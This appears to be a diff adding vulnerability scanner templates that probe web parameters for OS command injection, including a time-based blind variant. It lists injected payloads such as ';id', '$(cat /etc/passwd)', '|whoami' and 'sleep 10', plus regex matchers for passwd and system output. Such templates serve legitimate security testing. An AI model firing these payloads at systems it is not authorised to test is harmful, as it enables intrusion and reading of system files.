@@ -1,0 +1,156 @@
+id: command-injection
+
+info:
+  name: OS Command Injection
+  author: ancarna
+  severity: critical
+  description: Detects OS command injection vulnerabilities
+  tags: cmdi,injection,rce,owasp-top10
+  classification:
+    cwe-id: 78
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - ";id"
+        - "|id"
+        - "||id"
+        - "&id"
+        - "&&id"
+        - ";id;"
+        - "|id|"
+        - "`id`"
+        - "$(id)"
+        - ";cat /etc/passwd"
+        - "|cat /etc/passwd"
+        - "||cat /etc/passwd"
+        - "&cat /etc/passwd"
+        - "&&cat /etc/passwd"
+        - "`cat /etc/passwd`"
+        - "$(cat /etc/passwd)"
+        - ";ls -la"
+        - "|ls -la"
+        - ";uname -a"
+        - "|uname -a"
+        - ";whoami"
+        - "|whoami"
+        - "||whoami"
+        - "&whoami"
+        - "&&whoami"
+        - ";ping -c 1 127.0.0.1"
+        - "|ping -c 1 127.0.0.1"
+        - ";sleep 5"
+        - "|sleep 5"
+        - "||sleep 5"
+        - "&sleep 5"
+        - "&&sleep 5"
+        # Windows payloads
+        - "&dir"
+        - "&&dir"
+        - "|dir"
+        - "||dir"
+        - "&ipconfig"
+        - "|ipconfig"
+        - "&whoami"
+        - "|type C:\\Windows\\System32\\drivers\\etc\\hosts"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        name: linux-id
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+"
+
+      - type: regex
+        part: body
+        name: etc-passwd
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:1:1:"
+          - "bin:.*:2:2:"
+          - "[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:"
+
+      - type: regex
+        part: body
+        name: linux-uname
+        regex:
+          - "Linux .* [0-9]+\\.[0-9]+\\.[0-9]+"
+
+      - type: word
+        part: body
+        name: linux-commands
+        words:
+          - "total "
+          - "drwx"
+          - "-rw-"
+          - "Permission denied"
+        condition: or
+
+      - type: regex
+        part: body
+        name: windows-dir
+        regex:
+          - "Directory of [A-Za-z]:\\\\"
+          - "<DIR>"
+          - "Volume Serial Number is"
+
+      - type: regex
+        part: body
+        name: windows-ipconfig
+        regex:
+          - "Windows IP Configuration"
+          - "IPv4 Address"
+          - "Ethernet adapter"
+
+      - type: regex
+        part: body
+        name: windows-hosts
+        regex:
+          - "127\\.0\\.0\\.1\\s+localhost"
+          - "# Copyright \\(c\\) 1993-[0-9]+ Microsoft Corp"
+
+---
+id: command-injection-blind-time
+
+info:
+  name: Blind Command Injection - Time Based
+  author: ancarna
+  severity: high
+  description: Detects blind command injection through time-based inference
+  tags: cmdi,injection,rce,blind,time-based
+  classification:
+    cwe-id: 78
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - ";sleep 10"
+        - "|sleep 10"
+        - "||sleep 10"
+        - "&sleep 10"
+        - "&&sleep 10"
+        - "`sleep 10`"
+        - "$(sleep 10)"
+        - ";ping -c 10 127.0.0.1"
+        - "|ping -c 10 127.0.0.1"
+        # Windows
+        - "&ping -n 10 127.0.0.1"
+        - "|ping -n 10 127.0.0.1"
+        - "&timeout /t 10"
+        - "|timeout /t 10"
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=10"
